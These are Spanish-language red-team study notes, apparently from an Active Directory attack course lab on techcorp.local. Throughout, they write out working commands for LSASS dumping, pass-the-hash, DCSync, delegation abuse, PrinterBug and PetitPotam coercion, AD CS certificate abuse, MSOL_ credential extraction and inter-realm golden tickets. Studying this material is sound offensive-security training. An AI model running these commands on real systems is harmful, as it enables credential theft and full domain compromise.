tasklist /FI "IMAGENAME eq lsass.exe"
### Extracción de lsass.dmp
rundll32.exe C:\windows\System32\comsvcs.dll, MiniDump <lsass process ID> C:\Users\Public\lsass.dmp full
```

Desde una máquina Linux usar ``impacket`` o ``Physmem2profit``.
## OverPassTheHash

OPTH genera un nuevo proceso con las credenciales especificadas, hashes NTLM o claves AES

```
### Over Pass the hash (OPTH) genera tokens a partir de hashes o claves(Ejecutar como administrador)

Invoke-Mimikatz -Command '"sekurlsa::pth /user:Administrator /domain:us.techcorp.local /aes256:<aes256key> /run:powershell.exe"'
SafetyKatz.exe "sekurlsa::pth /user:administrator /domain:us.techcorp.local /aes256:<aes256keys> /run:cmd.exe" "exit"

### Los comandos anteriores inician una sesión PowerShell con un tipo de inicio de sesión 9 (igual que runas /netonly).
```
## DCSync

- DCSync Attack aprovecha la función de replicación (asociado al servicio de replicación) para extraer credenciales de datos específicos, usarios o todos los usuarios.
- ¿Por qué se usan los servicios de replicación? Porque si hay varios controladores de dominio en el entorno para mantener a todos y a cada uno de los controladores de dominio con todas las modificaciones que ocurren en cualquiera de los controladores de dominio, se utiliza un servicio de replicación y nosotros podemos usar ese servicio para solicitar credenciales para usuarios.
- De forma predeterminada se requeriran privilegios de administrador de dominio pero hay ciertos accesos, ACLs, que proporcionan privilegios para realizar DCSync.

```
• To extract credentials from the DC without code execution on it, we can use DCSync.

• To use the DCSync feature for getting krbtgt hash execute the below command with DA privileges for us domain:
Invoke-Mimikatz -Command '"lsadump::dcsync /user:us\krbtgt"'
SafetyKatz.exe "lsadump::dcsync /user:us\krbtgt" "exit"

• By default, Domain Admins privileges are required to run DCSync
```
## gMSA

- Una cuenta de servicio gestionada por grupo (gMSA) que proporciona gestión automática de contraseñas, gestión de SPN y administración delegada para cuentas de servicio en varios servidores.
- Se recomienda el uso de gMSA para protegerse de ataques del tipo Kerberoast.
- Se genera una contraseña aleatoria de 256 bytes que se rota cada 30 días.
- Cuando un usuario autorizado lee el atributo '``msds ManagedPassword``' se calcula la contraseña gMSA.
- Sólo los administradores especificados explícitamente pueden leer el blob de contraseñas. Incluso los Administradores de Dominio no pueden leerlo por defecto.
### Enumeration

- Un gMSA tiene la clase de objeto '``msDS-GroupManagedServiceAccount``'. Esto puede para encontrar las cuentas.

```
### Usando ADModule
Get-ADServiceAccount -Filter *

### Usando PowerView
Get-DomainObject -LDAPFilter '(objectClass=msDS-GroupManagedServiceAccount)'
```
### Explotación

- El atributo 'msDS-GroupMSAMembership' (PrincipalsAllowedToRetrieveManagedPassword) lista los principales que pueden leer el blob de contraseñas.
- Léalo utilizando ADModule:

```
Get-ADServiceAccount -Identity jumpone -Properties * | select PrincipalsAllowedToRetrieveManagedPassword
```

- El atributo 'msDS-ManagedPassword' almacena el blob de contraseñas en forma binaria de MSDS-MANAGEDPASSWORD_BLOB.
- Una vez que hemos comprometido un principal que puede leer el blob. Usa ADModule para leer y DSInternals para calcular el hash NTLM:

```
$Passwordblob = (Get-ADServiceAccount -Identity jumpone -Properties msDS-ManagedPassword).'msDS-ManagedPassword'

Import-Module C:\AD\Tools\DSInternals_v4.7\DSInternals\DSInternals.psd1

$decodedpwd = ConvertFrom-ADManagedPasswordBlob $Passwordblob

ConvertTo-NTHash -Password $decodedpwd.SecureCurrentPassword
```

- El atributo 'CurrentPassword' de $decodedpwd contiene la contraseña en texto claro, pero no se puede escribir.

- Para obtener la pass en texto claro se puede usar la herramienta ``GMSAPasswordReader.exe``:

```
GMSAPasswordReader.exe --accountname jumpone
```
### Golden gMSA

- La contraseña gMSA se calcula aprovechando el secreto almacenado en el objeto clave raíz KDS.
- Se necesitan algunos atributos de la clave raíz KDS para calcular el Group Key Envelope (GKE). Una vez calculada la GKE para la clave raíz KDS asociada, podemos generar la contraseña sin conexión.
- Sólo las cuentas privilegiadas como Domain Admins, Enterprise Admins o SYSTEM pueden recuperar la clave raíz KDS.
- [gMSA Active Directory Attacks](https://www.semperis.com/blog/golden-gmsa-attack/)

# Domain Privilege Escalation
## Kerberos Delegation - Unconstrained Delegation

- Cuando configuras con Unconstrained Delegation en un servicio, los clientes delegan/envian su TGT al servidor.
- El servicio puede actuar en nombre de un usuario o equipo en la red usando el TGT.
- Para configurar esto, se necesitan permisos de Domain o Enterprise Admin, en particular, ``SeEnableDelegation``.
#### Enumeración

- Ten en cuenta que pueden haber usuarios o equipos con la propiedad ``unconstrained delegation``

```
### Enumerar computadoras con "Unconstrained Delegation" habilitado
### PowerView
Get-DomainComputer -UnConstrained
Get-DomainUser -LDAPFilter "(userAccountControl:1.2.840.113556.1.4.803:=524288)"

### AD Module
Get-ADComputer -Filter {TrustedForDelegation -eq $True}
Get-ADUser -Filter {TrustedForDelegation -eq $True}
```
#### Explotación - Phishing

1. Comprometer servidor o cuenta de usuario(servicio) "Unconstrained delegation" habilitado 
2. Engañar a un administrador de dominio u otro usuario con privilegios elevados para que se conecte a un servicio en el servidor "Unconstrained delegation"
3. Después de la conexión, exportar los TGT
4. Reusar el TGT, por ejemplo, mediante PTH

```
### Privilege Escalation - Unconstrained Delegation
### Exportar los TGT
### Extrae y muestra los tickets de Kerberos (TGT y TGS) del sistema
Invoke-Mimikatz –Command '"sekurlsa::tickets /export"'

### Pass The Ticket
### Realiza PTT inyectando un ticket de Kerberos en el proceso actual
Invoke-Mimikatz –Command '"kerberos::ptt ticket.kirbi"'
```

Por defecto, si se intenta acceder a cualquier archivo compartido es una autenticación, esto puede ayudar a realizar un ataque de Ingeniería Social para explotar Unconstrained Delegation.
#### Explotación - Coerced Authentication
##### PrinterBug

- ¿Cómo engañamos a un usuario con privilegios elevados para que se conecte a una máquina con delegación no restringida? PrinterBug
- Una característica de MS-RPRN que permite a cualquier usuario de dominio (Usuario Autenticado) puede forzar a cualquier máquina (ejecutando el servicio Spooler) a conectarse en segundo lugar a una máquina de la elección del usuario de dominio
- Solo se puede aprovechar si está haciendo uso del servicio Print Spooler
- La mayoría de veces el servicio Print Spooler es desactivado en el DC

```
### Forzar autenticación de us-dc sobre us-web
### MS-RPRN.exe (https://github.com/leechristensen/SpoolSample)
.\MS-RPRN.exe \\us-dc.us.techcorp.local \\us-web.us.techcorp.local

### Capturar el TGT de us-dc$ en us-web
### Rubeus
.\Rubeus.exe monitor /interval:5
```

- El evento de inicio de sesión que Rubeus utiliza para supervisar los TGT es ``4624`` (Account Logon)
##### PetitPotam

PetitPotam utiliza la función ``EfsRpcOpenFileRaw`` del protocolo MS-EFSRPC (Encrypting File System Remote Protocol) y no necesita credenciales cuando se utiliza contra un DC.

```
### Forzar autenticación de us-dc sobre us-web
### PetitPotam.exe (https://github.com/topotam/PetitPotam)
.\PetitPotam.exe us-web us-dc

### Capturar el TGT de us-dc$ en us-web
### Rubeus
.\Rubeus.exe monitor /interval:5
```

Una vez obtenido el TGT del equipo, se debe realizar un PassTheTicket:

```
### Copia el TGT codificado en base64 y usalo en la maquina atacante
### Opcion 1
Rubeus.exe ptt /ticket:

### Invoke-Mimikatz
### Opcion 2
[IO.File]::WriteAllBytes("C:\AD\Tools\USDC.kirbi", [Convert]::FromBase64String("ticket_from_Rubeus_monitor"))
Invoke-Mimikatz -Command '"kerberos::ptt C:\AD\Tools\USDC.kirbi"'
```

Y con el TGT en la sesión se pueden, se pueden acceder a recursos compartidos, obtener acceso mediante WinRM o hasta realizar DCSync(si es que se tienen los suficientes permisos): 

```
### Ejecutar DCSync
Invoke-Mimikatz -Command '"lsadump::dcsync /user:us\krbtgt"'
```
#### Adicional

Solo como dato adicional, lo siguiente es un ataque desde Linux (no es parte del curso):
Si se compromete una cuenta de usuario(servicio) con "Unconstrained delegation" y se tienen permisos para modificar el SPN del mismo entonces ejecutar el siguiente ataque. 
1. Crear un registro DNS que apunte a nuestra máquina de ataque. Este registro DNS será un equipo falso en el entorno de Active Directory. 
2. Una vez registrado este registro DNS, añadiremos el SPN ``CIFS/nuestro_registro_dns`` a la cuenta que hemos comprometido, que se encuentra en una delegación no restringida. 
3. Así, si una víctima intenta conectarse a través de SMB a nuestra máquina falsa, enviará una copia de su TGT en su ticket TGS, ya que solicitará un ticket para ``CIFS/nuestro_registro_dns``. 
4. Este ticket TGS se enviará a la dirección IP que elegimos al registrar el registro DNS, es decir, nuestra máquina de ataque. Todo lo que tenemos que hacer entonces es extraer el TGT y utilizarlo. Este ataque también implica Coerced Authentication.
### Kerberos Delegation - Constrained Delegation

- Restringe los servicios a los que el servidor o cuenta de servicio puede actuar en nombre de un cliente.
- Unconstrained guarda TGT, Constrained no guarda TGT.
- Para realizar esto se realizaron algunas nuevas extensiones de kerberos (s4u)
	Kerberos protocol transition extension, S4U2Self
	Kerberos constrained delegation extension, S42Proxy
##### S4U2Self

- Permite a un servicio obtener un ticket de servicio para si mismo, es decir, si somos web01 podemos obtener un ticket para mi mismo(web01) en nombre de un cliente.
- Cualquier servicio(cuenta con SPN registrado) puede invocar S4USelf.
##### S4U2Proxy

- Para invocarlo se necesita tener un ST como evidencia de que algún usuario se ha conectado.
- Permite a un servicio obtener un ST en nombre del cliente antes conectado para un servicio diferente.

Existen dos formas de configurar Constrained Delegation:

- Kerberos only: permite la delegacion de credenciales cuando el cliente se autentica con Kerberos (usa S4U2Proxy).
- Protocol transition: independientemente de como se conecte el cliente, va a poder delegar credenciales sin ningún problema.
- Ejemplo: si el cliente se conecta con NTTLM hace uso de S4U2Self y S4U2Proxy, si se conecta con Kerberos hace uso de S4U2Proxy.

Si el servicio solo usa S4U2proxy ("Kerberos Only"), el cliente delega su ST no TGT y cuando usa "Protocol Transition", el servicio no necesita nada del cliente mas que su nombre. Ejemplo, si se conecta vegeta es suficiente para el servicio para tener acceso a credenciales de vegeta
### Kerberos Delegation - Constrained Delegation (Kerberos Only)

- Requiere un ST adicional para invocar para invocar S4U2Proxy, y que el ticket sea forwardable.
- Si consigues comprometer un servicio con kerberos only, y se conectan clientes al final dejarán sus ST y se puede abusar para invocar S4U2Proxy y acceder a servicios. Pero para esto, se debe esperar a que alguien se conecte.
- Si la cuenta de servicio comprometida tiene la característica ``TRUSTED_TO_AUTH_FOR_DELEGATION``(Protocol Transition), al invocar S4U2Self, recibimos un ST forwardable. Si no tiene esa caracteristica, no es forwardable. 
- La idea de la explotación es usar RBCD junto a Kerberos Only .
- Como controlas un servicio que está configurado con Kerberos Only puedes configurarle a ese propio servicio RBCD. Harás que ese servicio confié en una cuenta controlada que pueda invocar S4U2Self y sacar un ticket forwardable para usar el S4U2Proxy . 
#### Enumeración

- La cuenta de servicio **NO** tiene la característica ``TRUSTED_TO_AUTH_FOR_DELEGATION``

```
# Uso de ADModule
### Enumerar la delegación restringida
Get-ADObject -Filter {msDS-AllowedToDelegateTo -ne "$null"} -Properties msDS-AllowedToDelegateTo

# Uso de PowerView
Get-DomainUser –TrustedToAuth
Get-DomainComputer –TrustedToAuth
```
#### Explotación

- Dado que ``ms-DS-MachineAccountQuota`` está establecido en 10 para todos los usuarios del dominio, cualquier usuario del dominio puede crear una nueva cuenta de máquina y unirse a la misma en el dominio actual.

```
### Crear una nueva Cuenta de Máquina mediante Powermad
C:\AD\Tools\Powermad\Powermad.ps1 New-MachineAccount -MachineAccount studentcompX
```

- Ya hemos comprometido us-mgmt.
- Configure RBCD en us-mgmt utilizando la cuenta de equipo us-mgmt$.

```
### PTT
C:\AD\Tools\Rubeus.exe asktgt /user:us-mgmt$ /aes256:cc3e643e73ce17a40a20d0fe914e2d090264ac6babbb86e99e74d74016ed51b2 /impersonateuser:administrator /domain:us.techcorp.local /ptt /nowrap

### Configurar RBCD sobre us-mgmt hacia studentcomp76
Set-ADComputer -Identity us-mgmt$ -PrincipalsAllowedToDelegateToAccount studentcomp76$ -Verbose
```

- Ahora se puede aprovechar la cuenta de studentcomp76 para invocar S4U2Self y S4U2Proxy.
- El resultado es un ST completamente valido en nombre de la persona que queramos para acceder a us-mgmt (máquina con Constrained Delegation).

```
C:\AD\Tools\Rubeus.exe hash /password:P@ssword@123
C:\AD\Tools\Rubeus.exe s4u /impersonateuser:administrator /user:studentcompX$
/rc4:D3E5739141450E529B07469904FE8BDC /msdsspn:cifs/us-mgmt.us.techcorp.local /nowrap
```

- Usando el ST forwardable, se solicita un nuevo ST pero esta vez para el servicio HTTP en ``us-mssql.us.techcorp.local``
- Tener en cuenta que el valor de ``msdsspn`` depende de cómo esté configurado us-mgmt.

```
### Solicitar un nuevo ST mediante el uso del ticket anterior
### S42UProxy
C:\AD\Tools\Rubeus.exe s4u /tgs:doIGxjCCBsKgAwIBBaEDAgEWoo... /user:us-mgmt$
/aes256:cc3e643e73ce17a40a20d0fe914e2d090264ac6babbb86e99e74d74016ed51b2 /msdsspn:cifs/us-mssql.us.techcorp.local /altservice:http /nowrap /ptt

### Acceda a us-mssql utilizando WinRM como administrador del dominio.
```

### Kerberos Delegation - Constrained Delegation (Protocol Transition)

#### Enumeración

- La cuenta de servicio tiene la característica ``TRUSTED_TO_AUTH_FOR_DELEGATION``

```
### Constrained Delegation
### PowerView
Get-DomainUser –TrustedToAuth
Get-DomainComputer –TrustedToAuth

### Modulo ActiveDirectory
Get-ADObject -Filter {msDS-AllowedToDelegateTo -ne "$null"} -Properties msDS-AllowedToDelegateTo
```
#### Explotación

- La delegación se produce no sólo para el servicio especificado, sino para cualquier servicio que se ejecute bajo la misma cuenta. No hay validación para el SPN especificado.  
- El campo ``sname`` no está cifrado y puede modificarse al solicitar el TGS para cualquier SPN.  

```
# Usando Kekeo
### Se puede usar contraseña o un hash NTLM
### Solicitamos un TGT para la cuenta de servicio (Constrained Delegation)
tgt::ask /user:appsvc /domain:us.techcorp.local /rc4:1D49D390AC01D568F0EE9BE82BB74D4C

### Solicitar TGS usando S4U2self y S4U2proxy
tgs::s4u /tgt:TGT_appsvc@US.TECHCORP.LOCAL_krbtgt~us.techcorp.local@US.TECHCORP.LOCAL.kirbi /user:Administrator /service:CIFS/us-mssql.us.techcorp.local|HTTP/us-mssql.us.techcorp.local

- Además del servicio especificado en msDs-AllowedToDelegateTo, también se especifica un servicio alternativo que utiliza la misma cuenta de servicio que el especificado en msDs-AllowedToDelegateTo.
```

```
# Usando mimikatz
### Pass The Ticket (PTT) sobre el ticket de servicio
Invoke-Mimikatz '"kerberos::ptt TGS_Administrator@US.TECHCORP.LOCAL_HTTP~us-mssql.us.techcorp.local@US.TECHCORP.LOCAL_ALT.kirbi"'

### Ejecutar comando en máquina remota
### Es posible debido al ticket de servicio sobre HTTP
Invoke-Command -ScriptBlock{whoami} -ComputerName us-mssql.us.techcorp.local
```

```
# Usando Rubeus
### Solicitar TGS usando S4U2self y S4U2proxy
Rubeus.exe s4u /user:appsvc /rc4:1D49D390AC01D568F0EE9BE82BB74D4C /impersonateuser:administrator /msdsspn:CIFS/us-mssql.us.techcorp.local /altservice:HTTP /domain:us.techcorp.local /ptt

### Obtener cmd en máquina remota
### Es posible debido al ticket de servicio sobre HTTP
winrs -r:us-mssql cmd.exe
```
#### Persistence

- Tenga en cuenta que el ``msDS-AllowedToDelegateTo`` es la bandera de la cuenta de usuario que controla los servicios a los que una cuenta de usuario tiene acceso.  
- Esto significa que, con suficientes privilegios, es posible acceder a cualquier servicio desde un usuario: un buen truco de persistencia.
- ¿Suficientes privilegios? - SeEnableDelegationPrivilege en el DC y plenos derechos en el usuario de destino( por defecto para Domain Admins y Enterprise Admins)
- Es decir, podemos forzar 'Trusted to Authenticate for Delegation' y ms-DS-AllowedToDelegateTo en un usuario (o crear un nuevo usuario - que es más ruidoso) y abusar de él más tarde.  

```
# PowerView
# Persistencia - msDS-AllowedToDelegateTo
### Modificar el atributo SPN
Set-DomainObject -Identity devuser -Set @{serviceprincipalname='dev/svc'}
### Modificar el atributo msds-allowedtodelegateto
Set-DomainObject -Identity devuser -Set @{"msds-allowedtodelegateto"="ldap/us-dc.us.techcorp.local"}
### Activar o desactivar "useraccountcontrol"="16777216"
### El valor '16777216' corresponde a 'TRUSTED_TO_AUTHENTICATE_FOR_DELEGATION'
Set-DomainObject -SamAccountName devuser1 -Xor @{"useraccountcontrol"="16777216"}
### Enumerar usuarios Constrained Delegation
Get-DomainUser –TrustedToAuth
```

```
# Modulo AD
# Persistencia - msDS-AllowedToDelegateTo
### Modificar el atributo SPN
Set-ADUser -Identity devuser -ServicePrincipalNames @{Add='dev/svc'}
### Modificar el atributo msds-allowedtodelegateto
Set-ADUser -Identity devuser -Add @{'msDS-AllowedToDelegateTo'= @('ldap/us-dc','ldap/us-dc.us.techcorp.local')} -Verbose
### Activar 'TRUSTED_TO_AUTHENTICATE_FOR_DELEGATION'
Set-ADAccountControl -Identity devuser -TrustedToAuthForDelegation $true
### Enumerar objetos Constrained Delegation
Get-ADObject -Filter {msDS-AllowedToDelegateTo -ne "$null"} -Properties msDS-AllowedToDelegateTo
```

- Ahora el usuario ``devuser`` está configurado con Constrained Delegation - Protocol Transition

```
# Kekeo y Mimikatz
### Solicitar TGT
kekeo# tgt::ask /user:devuser /domain:us.techcorp.local /password:Password@123!

### Solicitar ST de Administrator sobre ldap
### Solo S4uSelf?
kekeo# tgs::s4u /tgt:TGT_devuser@us.techcorp.local_krbtgt~us.techcorp.local@us.techc
orp.local.kirbi /user:Administrator@us.techcorp.local /service:ldap/us-dc.us.techcorp.local

### PassTheTicket
Invoke-Mimikatz -Command '"kerberos::ptt TGS_Administrator@us.techcorp.local@us.techcorp.local_ldap~us-dc.us.techcorp.local@us.techcorp.local.kirbi"'

### Ataque DCSync
Invoke-Mimikatz -Command '"lsadump::dcsync /user:us\krbtgt"'
```

```
# Rubeus
### Obtener Hash 
Rubeus.exe hash /password:Password@123! /user:devuser /domain:us.techcorp.local

### S4U2Self 
Rubeus.exe s4u /user:devuser /rc4:539259E25A0361EC4A227DD9894719F6 /impersonateuser:administrator /msdsspn:ldap/us-dc.us.techcorp.local /domain:us.techcorp.local /ptt 

### Ataque DCSync
C:\AD\Tools\SafetyKatz.exe "lsadump::dcsync /user:us\krbtgt" "exit"
```
### RBCD

- Para configurar RBCD no necesitas privilegios de Domain o Enterprise Admin
- RBCD se configura en un atributo que tienen las cuentas de servicio llamada ``msDS-AllowedToActObBehalfOfOtherIdentity``, entonces si en algún momento tienes permisos de escritura para escribir este atributo en cualquier cuenta de servicio, le podrás configurar RBCD para que confíe en una cuenta que controles.


```
### Ya tenemos acceso a una máquina unida a un dominio
### Vamos a enumerar si tenemos permisos de escritura sobre algún objeto
### Usando PowerView
Find-InterestingDomainAcl | ?{$_.identityreferencename -match 'mgmtadmin'}
```


```
Get-ADComputer -Identity US-HELPDESK -Properties msds-allowedtoactonbehalfofotheridentity
```

```
### Usando el modulo ActiveDirectory 
### Configurar RBCD en us-helpdesk para que confíe en $comps
$comps = 'student1$'
Set-ADComputer -Identity us-helpdesk -PrincipalsAllowedToDelegateToAccount $comps

### Ahora, obtengamos los privilegios de studentx$ extrayendo sus claves AES:
Invoke-Mimikatz -Command '"sekurlsa::ekeys"'
```

```
### AES key de studentx$ para acceder a us-helpdesk como CUALQUIER usuario que queramos
### Rubeus
.\Rubeus.exe s4u /user:student1$ /aes256:d1027fbaf7faad598aaeff08989387592c0d8e0201ba453d83b9e6b7fc7897c2 /msdsspn:http/us-helpdesk /impersonateuser:administrator /ptt

winrs -r:us-helpdesk cmd.exe
```



# Cross Trust Attacks

## AD CS

- Active Directory Certificate Services (AD CS) permite el uso de Public Key Infrastructure (PKI) en el bosque de Active Directory.  
- AD CS ayuda a autenticar usuarios y máquinas, cifrar y firmar documentos, sistemas de archivos, correos electrónicos y mucho más.
### Terminología

- CA - La autoridad de certificación que emite certificados. El servidor con función AD CS (DC o independiente) es la CA.  
- Certificado - Emitido a un usuario o máquina y puede ser utilizado para autenticación, encriptación, firma, etc. 
- CSR - Solicitud de firma de certificado realizada por un cliente a la CA para solicitar un certificado.  
- Certificate Template: define la configuración de un certificado. Contiene información como permisos de inscripción, EKU, caducidad, etc.  
- EKU OID: identificadores de objetos de usos de claves ampliados. Determinan el uso de una plantilla de certificado (autenticación de cliente, inicio de sesión con tarjeta inteligente, SubCA, etc.).  
### Certificate Service

Existen muchas formas de encontrar certificados para su posterior explotación, una de esas formas es mediante el listado de certificados almacenados de forma local en la máquina.

```
### Listar certificados
ls cert:\LocalMachine\My

### Listar certificados mediante reg.exe
reg query "HKEY_LOCAL_MACHINE\SOFTWARE\Microsoft\SystemCertificates"
reg query "HKEY_LOCAL_MACHINE\SOFTWARE\Microsoft\SystemCertificates\MY"
reg query "HKEY_LOCAL_MACHINE\SOFTWARE\Microsoft\SystemCertificates\MY\Certificates"
```

```
### Exportar certificado
ls cert:\LocalMachine\My\89C1171F6810A6725A47DB8D572537D736D4FF17 | Export-PfxCertificate -FilePath C:\Users\Public\pawadmin.pfx -Password (ConvertTo-SecureString -String 'SecretPass@123' -Force -AsPlainText)
```
### Abuse ADCS

- Extraer certificados de usuario y de máquina
- Usar certificados para recuperar hash NTLM
- Persistencia a nivel de usuario y máquina
- Escalado a administrador de dominio y administrador de empresa
- Persistencia de dominio
## Enumeración

Que no aparezcan plantillas vulnerables no significa que no haya algún tipo de misconfiguración, puede que  tengamos permisos como algún usuario en particular.

Requisitos comunes/configuraciones erróneas para todas las Escalaciones
- CA concede derechos de inscripción a usuarios con privilegios normales/bajos
- La aprobación del administrador está desactivada
- No se requieren firmas de autorización
- La plantilla de destino concede derechos de inscripción a usuarios con privilegios normales/bajos.

```
### Podemos utilizar la herramienta Certify para enumerar (y para otros ataques) AD CS en el bosque objetivo:
### Ayudará a identificar si tenemos un servidor CA
Certify.exe cas

### Enumerar las plantillas:
### Enumerar todas las plantillas, las configuraciones aplicadas a cada una, permisos
Certify.exe find

### Enumerar las plantillas vulnerables:
### 
Certify.exe find /vulnerable
```
## Explotación

- En techcorp, el usuario pawadmin tiene derechos de inscripción a una plantilla ``ForAdminsofPrivilegedAccessWorkstations``
- La plantilla tiene el valor ENROLLEE_SUPPLIES_SUBJECT para msPKI- Bandera de nombre de certificado. (ESC1)
- Esto significa que pawadmin puede solicitar certificados para CUALQUIER usuario.
- Tenga en cuenta que esto no aparece cuando se enumeran vulnerables vulnerables en Certify

```
Certify.exe find
Certify.exe find /enrolleeSuppliesSubject
```

- Tenemos el certificado de pawadmin que extrajimos de us-jump. (THEFT4)
- Usamos el certificado para pedir un TGT para pawadmin e inyectarlo: 

```
C:\AD\Tools\Rubeus.exe asktgt /user:pawadmin /certificate:C:\AD\Tools\pawadmin.pfx /password:SecretPass@123 /nowrap /ptt
```


```
- ¡Solicitar un certificado para DA!
C:\AD\Tools\Certify.exe request /ca:Techcorp-DC.techcorp.local\TECHCORP-DC-CA /template:ForAdminsofPrivilegedAccessWorkstations /altname:Administrator

- Convertir de cert.pem a pfx:
C:\AD\Tools\openssl\openssl.exe pkcs12 -in C:\AD\Tools\cert.pem -keyex -CSP "Microsoft Enhanced Cryptographic Provider v1.0" -export -out C:\AD\Tools\DA.pfx

- Solicitar DA TGT e inyectarlo:
C:\AD\Tools\Rubeus.exe asktgt /user:Administrator /certificate:C:\AD\Tools\DA.pfx /password:SecretPass@123 /nowrap /ptt
```

```
• Request a certificate for EA!
C:\AD\Tools\Certify.exe request /ca:Techcorp-DC.techcorp.local\TECHCORP-DC-CA /template:ForAdminsofPrivilegedAccessWorkstations /altname:Administrator
• Convert from cert.pem to pfx:
C:\AD\Tools\openssl\openssl.exe pkcs12 -in C:\AD\Tools\cert.pem -keyex -CSP "Microsoft Enhanced Cryptographic Provider v1.0" -export -out C:\AD\Tools\EA.pfx
• Request EA TGT and inject it:
C:\AD\Tools\Rubeus.exe asktgt /user:techcorp.local\Administrator /dc:techcorp-dc.techcorp.local /certificate:C:\AD\Tools\EA.pfx /password:SecretPass@123 /nowrap /ptt
```

## Shadow Credentials

- Los usuarios y ordenadores tienen el atributo ``msDS-KeyCredentialLink`` que contiene las claves públicas sin procesar del certificado que se puede utilizar como una credencial alternativa.
- Este atributo se utiliza cuando configuramos ``Windows Hello for Business (WHfB)``
- Por defecto, los administradores de claves y los administradores de claves de empresa tienen derechos para modificar el atributo ``msDS-KeyCredentialLink``.
- Se puede solicitar el ``User to User Service Ticket (U2U)`` para descifrar la entidad ``NTLM_SUPPLEMENTAL_CREDENTIAL`` cifrada del ``Privilege Attribute Certificate (PAC)`` y extraer el hash NTLM.

 Requisitos previos para abusar de Shadow Credentials:
- AD CS (Key Trust si AD CS no está presente)
- Compatibilidad con PKINIT y al menos un DC con Windows Server 2016 o superior.
- Permisos (GenericWrite/GenericAll) para modificar el atributo ``msDS-KeyCredentialLink`` del objeto de destino.

# Azure AD

- Azure AD es un método popular para ampliar la gestión de identidades de AD local a las ofertas Azure de Microsoft.
- AD Connect está instalado on-premise en un servidor.

Un AD local puede integrarse con Azure AD utilizando Azure AD Connect con los siguientes métodos:
1. Sincronización de hash de contraseñas (PHS)
	Todas las credenciales de On-Prem se codifican y sincronizan con Azure AD.
2. Autenticación Pass-Through (PTA)
	Azure AD reenvía las credenciales a on-prem AD.
	On-Prem comprueba si la credencial es válida o no, este resultado se devuelve a Azure AD, y Azure AD permite o no al usuario acceder a los recursos de Azure.
3. Federación
	Autenticación basada en SAML.
	Contiene una cuenta con privilegios elevados llamada ``MSOL_<RANDOM_ID>`` que realiza DCSync cada dos minutos.
	Las credenciales para esta cuenta  ``MSOL_<RANDOM_ID>``  están almacenadas en texto claro, texto que se almacena en una base de datos MSSQL Express en forma de texto claro.
## Attacking PHS

- Si logras acceder a la cuenta ``MSOL_<RANDOM_ID>`` tienes privilegios para realizar DCSync y extraer credenciales del directorio activo. 
- No será detectado por MDI si DCSync utiliza el usuario MSOL_, ya que este usuario suele estar en la lista de exclusión de MDI debido a sus frecuentes DCSync
- Para acceder a este usuario necesitamos acceder a la maquina donde está instalado Azure Ad Connect.
- Entonces si se logra extraer esta contraseña, se podrían ganar acceso incluso hasta a Azure AD.
#### Enumeración 

- Enumere la cuenta PHS y el servidor donde está instalado AD Connect.
- Tener en cuenta que la descripción de la cuenta ``MSOL_<RANDOM_ID>`` se crea de forma predeterminada cuando está la conexión con Azure. La descripción sigue el siguiente texto: "Cuenta creada por Microsoft Azure Active Directory Connect con el identificador de instalación ... que se ejecuta en el equipo ... "

```
• Using PowerView:
Get-DomainUser -Identity "MSOL_*" -Domain techcorp.local

• Using the ActiveDirectory module:
Get-ADUser -Filter "samAccountName -like 'MSOL_*'" -Server techcorp.local -Properties * | select SamAccountName,Description | fl
```
#### Explotación

- Tener en cuenta que ADCCONECT ejecuta powershell.exe en el fondo de forma que se iniciarían transcripciones o bloques de guion en el registro. Si desea evitar la ejecución de powershell, tienes que modificar la conexión ``ADCConnect.ps1``
- Con privilegios administrativos, si ejecutamos adconnect.ps1, podemos extraer las credenciales de la cuenta ``MSOL_<RANDOM_ID>`` utilizada por AD Connect en texto claro.

```
### Obtención de contraseña en texto claro
.\adconnect.ps1

### Ejecución de comando como MSOL_<RANDOM_ID>
runas /user:techcorp.local\MSOL_<RANDOM_ID> /netonly cmd
```
# Cross Domain Attacks (Child Domain to Forest Root)

## sIDHistory

sIDHistory es un atributo de usuario diseñado para escenarios donde un usuario es movido de un dominio a otro. Cuando se cambia el dominio de un usuario, éste obtiene un nuevo SID y el antiguo SID se añade a sIDHistory.

- Enterprise Admins group tiene acceso a todos los dominios de un bosque.
- Enterprise Admins group sólo existe en la raíz del bosque.

Se puede abusar de sIDHistory de dos maneras para escalar privilegios dentro de un bosque:
- hash krbtgt del hijo
- Tickets de confianza
### sIDHistory - Trust Key

- Se necesita estar en el controlador de dominio para invocar ``lsadump::lsa /patch``
- Cada 30 dias se rotan las claves de confianza
- Se tiene que usar la ultima clave de confianza establecida  ``[In]``
- Lo que se necesita para falsificar Trust Key es la clave de confianza. 

```
### Obtención de Trust Key de forma remota
Invoke-Mimikatz -Command '"lsadump::trust /patch"' -ComputerName us-dc

### Obtención de Trust Key mediante DCSync
Invoke-Mimikatz -Command '"lsadump::dcsync /user:us\techcorp$"'

### Obtención de Trust Key en DC
Invoke-Mimikatz -Command '"lsadump::lsa /patch"'
```

- Con las claves de confianza obtenidas se puede generar un ``inter-realM TGT ``
- La opción ``/sids`` de mimikatz está configurando forzosamente el sIDHistory para el grupo Enterprise Admin para ``us.techcorp.local`` que es el grupo de administración de empresas forestales.
- Enterprise Admins (RID 519)

```
### Generar un inter-realm TGT

Invoke-Mimikatz -Command '"kerberos::golden /domain:<DOMAIN_CHILD> /sid:<SID_DOMAIN_CHILD> /sids:<SID_DOMAIN_PARENT>-<RID> /rc4:<TRUST_HASH> /user:Administrator /service:krbtgt /target:<DOMAIN_PARENT> /ticket:C:\PATH\TO\SAVE\output.kirbi"'

Invoke-Mimikatz -Command '"kerberos::golden /domain:<DOMAIN_CHILD> /sid:<SID_DOMAIN_CHILD> /sids:<SID_DOMAIN_PARENT>-<RID> /rc4:<TRUST_HASH> /user:Administrator /service:krbtgt /target:<DOMAIN_PARENT> /ptt"'

Invoke-Mimikatz -Command '"kerberos::golden /domain:us.techcorp.local /sid:S-1-5-21-210670787-2521448726-163245708 /sids:S-1-5-21-2781415573-3701854478-2406986946-519 /rc4:b59ef5860ce0aa12429f4f61c8e51979 /user:Administrator /service:krbtgt /target:techcorp.local /ticket:C:\AD\Tools\trust_tkt.kirbi"'
```

- Usando el TGT, se solicita un TGS para un servicio en particular
- Los tickets para otros servicios (como HOST y RPCSS para WMI, HTTP para PowerShell Remoting y WinRM) también pueden ser creados

```
### Generar un ST para el servicio CIFS
### Mediante Kekeo
tgs::ask /tgt:C:\AD\Tools\trust_tkt.kirbi /service:CIFS/techcorp-dc.techcorp.local
### Mediante Old Kekeo
.\asktgs.exe C:\AD\Tools\trust_tkt.kirbi CIFS/techcorp-dc.techcorp.local
```

